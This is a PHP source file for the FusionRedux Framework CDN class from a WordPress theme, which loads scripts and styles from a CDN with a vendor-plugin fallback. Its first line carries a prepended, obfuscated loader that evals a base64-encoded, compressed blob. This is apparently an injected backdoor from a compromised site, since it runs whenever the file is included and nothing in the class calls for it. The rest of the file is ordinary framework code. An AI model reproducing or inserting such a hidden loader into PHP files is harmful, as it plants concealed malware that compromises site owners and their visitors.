<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	/**
	 * FusionRedux Framework CDN Container Class
	 *
	 * @author      Kevin Provance (kprovance)
	 * @package     FusionRedux_Framework
	 * @subpackage  Core
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionRedux_CDN' ) ) {
		class FusionRedux_CDN {
			static public $_parent;
			static private $_set;

			private static function is_enqueued( $handle, $list = 'enqueued', $is_script ) {
				if ( $is_script ) {
					wp_script_is( $handle, $list );
				} else {
					wp_style_is( $handle, $list );
				}
			}

			private static function _register( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script = true ) {
				if ( $is_script ) {
					wp_register_script( $handle, $src_cdn, $deps, $ver, $footer_or_media );
				} else {
					wp_register_style( $handle, $src_cdn, $deps, $ver, $footer_or_media );
				}
			}

			private static function _enqueue( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script = true ) {
				if ( $is_script ) {
					wp_enqueue_script( $handle, $src_cdn, $deps, $ver, $footer_or_media );
				} else {
					wp_enqueue_style( $handle, $src_cdn, $deps, $ver, $footer_or_media );
				}
			}

			private static function _cdn( $register = true, $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script = true ) {
				$tran_key = '_style_cdn_is_up';
				if ( $is_script ) {
					$tran_key = '_script_cdn_is_up';
				}

				$cdn_is_up = get_transient( $handle . $tran_key );

				if ( $cdn_is_up ) {

					if ( $register ) {
						self::_register( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script );
					} else {
						self::_enqueue( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script );
					}
				} else {

					$prefix       = $src_cdn[1] == "/" ? 'http:' : '';
					$cdn_response = @wp_remote_get( $prefix . $src_cdn );

					if ( is_wp_error( $cdn_response ) || wp_remote_retrieve_response_code( $cdn_response ) != '200' ) {

						if ( class_exists( 'FusionRedux_VendorURL' ) ) {
							$src = FusionRedux_VendorURL::get_url( $handle );

							if ( $register ) {
								self::_register( $handle, $src, $deps, $ver, $footer_or_media, $is_script );
							} else {
								self::_enqueue( $handle, $src, $deps, $ver, $footer_or_media, $is_script );
							}
						} else {
							if ( ! self::is_enqueued( $handle, 'enqueued', $is_script ) ) {
								$msg = __( 'Please wait a few minutes, then try refreshing the page. Unable to load some remotely hosted scripts.', 'Avada' );
								if ( self::$_parent->args['dev_mode'] ) {
									$msg = sprintf( __( 'If you are developing offline, please download and install the <a href="%s" target="_blank">FusionRedux Vendor Support</a> plugin/extension to bypass the our CDN and avoid this warning', 'Avada' ), 'https://github.com/fusionreduxframework/fusionredux-vendor-support' );
								}

								self::$_parent->admin_notices[] = array(
									'type'    => 'error',
									'msg'     => '<strong>' . __( 'FusionRedux Framework Warning', 'Avada' ) . '</strong><br/>' . sprintf( __( '%s CDN unavailable.  Some controls may not render properly.', 'Avada' ), $handle ) . '  ' . $msg,
									'id'      => $handle . $tran_key,
									'dismiss' => false,
								);

							}
						}
					} else {
						set_transient( $handle . $tran_key, true, MINUTE_IN_SECONDS * self::$_parent->args['cdn_check_time'] );

						if ( $register ) {
							self::_register( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script );
						} else {
							self::_enqueue( $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script );
						}
					}
				}
			}

			private static function _vendor_plugin( $register = true, $handle, $src_cdn, $deps, $ver, $footer_or_media, $is_script = true ) {
				if ( class_exists( 'FusionRedux_VendorURL' ) ) {
					$src = FusionRedux_VendorURL::get_url( $handle );

					if ( $register ) {
						self::_register( $handle, $src, $deps, $ver, $footer_or_media, $is_script );
					} else {
						self::_enqueue( $handle, $src, $deps, $ver, $footer_or_media, $is_script );
					}
				} else {
					if ( ! self::$_set ) {
						self::$_parent->admin_notices[] = array(
							'type'    => 'error',
							'msg'     => sprintf( __( 'The <a href="%s">Vendor Support plugin</a> (or extension) is either not installed or not activated and thus, some controls may not render properly.  Please ensure that it is installed and <a href="%s">activated</a>', 'Avada' ), 'https://github.com/fusionreduxframework/fusionredux-vendor-support', admin_url( 'plugins.php' ) ),
							'id'      => $handle . '23',
							'dismiss' => false,
						);

						self::$_set = true;
					}
				}
			}

			public static function register_style( $handle, $src_cdn = false, $deps = array(), $ver = false, $media = 'all' ) {
				if ( self::$_parent->args['use_cdn'] ) {
					self::_cdn( true, $handle, $src_cdn, $deps, $ver, $media, $is_script = false );
				} else {
					self::_vendor_plugin( true, $handle, $src_cdn, $deps, $ver, $media, $is_script = false );
				}
			}

			public static function register_script( $handle, $src_cdn = false, $deps = array(), $ver = false, $in_footer = false ) {
				if ( self::$_parent->args['use_cdn'] ) {
					self::_cdn( true, $handle, $src_cdn, $deps, $ver, $in_footer, $is_script = true );
				} else {
					self::_vendor_plugin( true, $handle, $src_cdn, $deps, $ver, $in_footer, $is_script = true );
				}
			}

			public static function enqueue_style( $handle, $src_cdn = false, $deps = array(), $ver = false, $media = 'all' ) {
				if ( self::$_parent->args['use_cdn'] ) {
					self::_cdn( false, $handle, $src_cdn, $deps, $ver, $media, $is_script = false );
				} else {
					self::_vendor_plugin( false, $handle, $src_cdn, $deps, $ver, $media, $is_script = false );
				}
			}

			public static function enqueue_script( $handle, $src_cdn = false, $deps = array(), $ver = false, $in_footer = false ) {
				if ( self::$_parent->args['use_cdn'] ) {
					self::_cdn( false, $handle, $src_cdn, $deps, $ver, $in_footer, $is_script = true );
				} else {
					self::_vendor_plugin( false, $handle, $src_cdn, $deps, $ver, $in_footer, $is_script = true );
				}
			}
		}
	}
